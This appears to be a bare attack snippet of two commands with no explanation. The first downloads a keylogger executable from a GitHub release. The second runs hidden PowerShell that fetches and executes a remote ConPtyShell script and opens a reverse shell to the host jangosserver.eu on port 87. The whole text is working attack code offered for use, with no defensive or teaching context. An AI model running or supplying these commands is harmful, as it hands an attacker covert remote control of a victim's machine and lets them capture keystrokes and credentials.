wget https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe
powershell -WindowStyle Hidden -Command "IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Resolve-DnsName jangosserver.eu).IPAddress 87"
